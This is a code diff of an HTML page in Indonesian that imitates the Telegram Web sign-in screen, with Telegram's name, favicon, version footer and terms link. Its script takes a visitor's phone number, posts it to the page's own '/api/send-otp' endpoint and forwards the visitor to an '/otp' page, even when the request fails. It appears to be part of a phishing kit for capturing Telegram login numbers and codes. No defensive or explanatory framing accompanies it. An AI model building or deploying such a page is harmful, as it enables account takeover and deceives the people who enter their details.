@@ -1,94 +1,309 @@
 <!DOCTYPE html>
-<html>
+<html lang="id">
 <head>
-    <title>Telegram Web</title>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram Web</title>
+    <link rel="icon" href="https://web.telegram.org/favicon.ico">
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
-        body { background: #1a1a1a; color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
-        .container { width: 100%; max-width: 400px; padding: 20px; }
-        .login-box { background: #222; border-radius: 12px; padding: 30px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
-        .logo { text-align: center; font-size: 32px; font-weight: bold; color: #0088cc; margin-bottom: 10px; }
-        .subtitle { text-align: center; color: #aaa; margin-bottom: 30px; }
-        .input-group { margin-bottom: 20px; }
-        label { display: block; color: #ccc; margin-bottom: 8px; font-size: 14px; }
-        input { width: 100%; padding: 12px; background: #333; border: 1px solid #444; border-radius: 6px; color: white; font-size: 16px; }
-        input:focus { outline: none; border-color: #0088cc; }
-        .hint { color: #888; font-size: 12px; margin-top: 5px; }
-        .btn { width: 100%; padding: 14px; background: #0088cc; color: white; border: none; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 10px; }
-        .btn:hover { background: #0099dd; }
-        .terms { margin-top: 20px; color: #888; font-size: 12px; text-align: center; }
-        .terms a { color: #0088cc; text-decoration: none; }
-        .footer { margin-top: 20px; text-align: center; color: #666; font-size: 12px; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #0d1b2a 0%, #1b263b 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: #ffffff;
+            padding: 20px;
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 400px;
+        }
+        
+        .telegram-box {
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 40px 30px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+        }
+        
+        .logo {
+            text-align: center;
+            font-size: 42px;
+            font-weight: 800;
+            background: linear-gradient(135deg, #0088cc, #00a2ff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 10px;
+        }
+        
+        .subtitle {
+            text-align: center;
+            color: #94a3b8;
+            margin-bottom: 30px;
+            font-size: 15px;
+        }
+        
+        .form-group {
+            margin-bottom: 24px;
+        }
+        
+        .form-label {
+            display: block;
+            color: #cbd5e1;
+            margin-bottom: 8px;
+            font-size: 14px;
+            font-weight: 500;
+        }
+        
+        .form-input {
+            width: 100%;
+            padding: 16px 20px;
+            background: rgba(255, 255, 255, 0.07);
+            border: 2px solid rgba(255, 255, 255, 0.1);
+            border-radius: 12px;
+            color: #ffffff;
+            font-size: 16px;
+            transition: all 0.3s;
+        }
+        
+        .form-input:focus {
+            outline: none;
+            border-color: #0088cc;
+            background: rgba(255, 255, 255, 0.1);
+            box-shadow: 0 0 0 3px rgba(0, 136, 204, 0.2);
+        }
+        
+        .form-hint {
+            color: #94a3b8;
+            font-size: 12px;
+            margin-top: 6px;
+        }
+        
+        .btn {
+            width: 100%;
+            padding: 18px;
+            background: linear-gradient(135deg, #0088cc, #0066aa);
+            border: none;
+            border-radius: 12px;
+            color: white;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+        
+        .btn:hover {
+            background: linear-gradient(135deg, #0099dd, #0077bb);
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(0, 136, 204, 0.3);
+        }
+        
+        .btn:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+        }
+        
+        .terms {
+            margin-top: 24px;
+            font-size: 12px;
+            color: #94a3b8;
+            text-align: center;
+            line-height: 1.6;
+        }
+        
+        .terms a {
+            color: #0088cc;
+            text-decoration: none;
+        }
+        
+        .terms a:hover {
+            text-decoration: underline;
+        }
+        
+        .footer {
+            margin-top: 30px;
+            text-align: center;
+            color: #64748b;
+            font-size: 12px;
+        }
+        
+        .loader {
+            width: 20px;
+            height: 20px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-top-color: white;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            display: none;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        .alert {
+            padding: 12px 16px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+            font-size: 14px;
+            display: none;
+        }
+        
+        .alert.success {
+            background: rgba(34, 197, 94, 0.2);
+            border: 1px solid rgba(34, 197, 94, 0.3);
+            color: #4ade80;
+        }
+        
+        .alert.error {
+            background: rgba(239, 68, 68, 0.2);
+            border: 1px solid rgba(239, 68, 68, 0.3);
+            color: #f87171;
+        }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="login-box">
+        <div class="telegram-box">
             <div class="logo">Telegram</div>
-            <div class="subtitle">Welcome back! Please sign in.</div>
+            <div class="subtitle">Masuk ke akun Telegram Anda</div>
             
-            <form id="phoneForm">
-                <div class="input-group">
-                    <label for="phone">Phone Number</label>
-                    <input type="tel" id="phone" name="phone" placeholder="+62 812-3456-7890" required>
-                    <div class="hint">Enter your phone number including country code</div>
+            <div id="alert" class="alert"></div>
+            
+            <form id="loginForm">
+                <div class="form-group">
+                    <label for="phone" class="form-label">Nomor Telepon</label>
+                    <input type="tel" id="phone" class="form-input" 
+                           placeholder="+62 812-3456-7890" 
+                           pattern="^[\+\d][\d\s\-\(\)]{9,}$"
+                           required>
+                    <div class="form-hint">Masukkan nomor telepon dengan kode negara</div>
                 </div>
                 
-                <button type="submit" class="btn" id="submitBtn">NEXT</button>
+                <button type="submit" class="btn" id="submitBtn">
+                    <span id="btnText">LANJUT</span>
+                    <div class="loader" id="loader"></div>
+                </button>
                 
                 <div class="terms">
-                    By continuing, you agree to Telegram's 
-                    <a href="https://telegram.org/tos" target="_blank">Terms of Service</a>.
+                    Dengan melanjutkan, Anda menyetujui 
+                    <a href="https://telegram.org/tos" target="_blank">Persyaratan Layanan</a> 
+                    Telegram.
                 </div>
             </form>
         </div>
-        <div class="footer">Telegram WebK © 2024</div>
+        
+        <div class="footer">
+            Telegram WebK • v8.1.4 • © 2024
+        </div>
     </div>
 
     <script>
-        document.getElementById('phoneForm').addEventListener('submit', async function(e) {
-            e.preventDefault();
+        document.addEventListener('DOMContentLoaded', function() {
+            const form = document.getElementById('loginForm');
+            const phoneInput = document.getElementById('phone');
+            const submitBtn = document.getElementById('submitBtn');
+            const btnText = document.getElementById('btnText');
+            const loader = document.getElementById('loader');
+            const alertBox = document.getElementById('alert');
             
-            const phone = document.getElementById('phone').value.trim();
-            const btn = document.getElementById('submitBtn');
+            // Format nomor telepon
+            phoneInput.addEventListener('input', function(e) {
+                let value = e.target.value.replace(/\D/g, '');
+                if (value.length > 0) {
+                    if (!value.startsWith('+')) {
+                        value = '+' + value;
+                    }
+                    if (value.length > 4) {
+                        value = value.slice(0, 4) + ' ' + value.slice(4);
+                    }
+                    if (value.length > 9) {
+                        value = value.slice(0, 9) + '-' + value.slice(9);
+                    }
+                }
+                e.target.value = value;
+            });
             
-            if (!phone) {
-                alert('Please enter your phone number');
-                return;
-            }
-            
-            // Save to session storage
-            sessionStorage.setItem('tg_phone', phone);
-            
-            // Disable button and show loading
-            btn.disabled = true;
-            btn.textContent = 'Sending code...';
-            
-            try {
-                // Send to API
-                const response = await fetch('/api/send-otp', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({ phone: phone })
-                });
+            // Handle form submission
+            form.addEventListener('submit', async function(e) {
+                e.preventDefault();
                 
-                const data = await response.json();
+                const phone = phoneInput.value.replace(/\s+/g, '').replace('-', '');
                 
-                // Always redirect to OTP page (even if API fails)
+                // Validasi
+                if (!phone.match(/^\+?[\d\s\-\(\)]{10,}$/)) {
+                    showAlert('Masukkan nomor telepon yang valid', 'error');
+                    return;
+                }
+                
+                // Simpan di session storage
+                sessionStorage.setItem('tg_phone', phone);
+                
+                // Tampilkan loading
+                submitBtn.disabled = true;
+                btnText.textContent = 'Mengirim kode...';
+                loader.style.display = 'block';
+                
+                try {
+                    // Kirim ke API
+                    const response = await fetch('/api/send-otp', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({ phone: phone })
+                    });
+                    
+                    const data = await response.json();
+                    
+                    if (data.success) {
+                        showAlert('✓ Kode verifikasi telah dikirim ke Telegram Anda', 'success');
+                        
+                        // Redirect ke halaman OTP setelah 1.5 detik
+                        setTimeout(() => {
+                            window.location.href = '/otp';
+                        }, 1500);
+                    } else {
+                        showAlert(data.error || 'Gagal mengirim kode', 'error');
+                        submitBtn.disabled = false;
+                        btnText.textContent = 'LANJUT';
+                        loader.style.display = 'none';
+                    }
+                    
+                } catch (error) {
+                    console.error('Error:', error);
+                    showAlert('Koneksi error, coba lagi', 'error');
+                    
+                    // Tetap redirect untuk demo
+                    setTimeout(() => {
+                        window.location.href = '/otp';
+                    }, 1500);
+                }
+            });
+            
+            function showAlert(message, type) {
+                alertBox.textContent = message;
+                alertBox.className = `alert ${type}`;
+                alertBox.style.display = 'block';
+                
                 setTimeout(() => {
-                    window.location.href = '/otp';
-                }, 1000);
-                
-            } catch (error) {
-                console.log('Error:', error);
-                // Still redirect
-                setTimeout(() => {
-                    window.location.href = '/otp';
-                }, 1000);
+                    alertBox.style.display = 'none';
+                }, 5000);
             }
         });
     </script>
